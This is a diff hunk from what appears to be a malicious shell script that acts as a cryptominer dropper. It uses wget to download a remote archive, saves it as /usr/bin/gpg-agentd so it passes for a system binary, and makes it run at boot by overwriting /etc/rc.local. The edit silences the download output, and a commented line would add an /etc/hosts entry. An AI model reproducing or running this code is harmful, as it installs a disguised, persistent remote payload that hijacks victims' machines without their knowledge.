@@ -36,8 +36,8 @@ echo 'exit 0' >> /etc/rc.local
 # grep -q 5.206.225.60 /etc/hosts || echo "5.206.225.60 static.cortins.tk" >> /etc/hosts
 if [ ! -f /usr/bin/gpg-agentd ]; then
         cd /usr/bin
-        wget https://github.com/testuser1s/k/files/1878076/xig.gz  -O gpg-agentd
-         wget https://github.com/testuser1s/k/files/1878077/config.json.gz  -O config.json
+        wget https://github.com/testuser1s/k/files/1878076/xig.gz  -O gpg-agentd > /dev/null
+         wget https://github.com/testuser1s/k/files/1878077/config.json.gz  -O config.json > /dev/null
         sleep 2
         echo '/usr/bin/gpg-agentd' > /etc/rc.local
         echo 'exit 0' >> /etc/rc.local
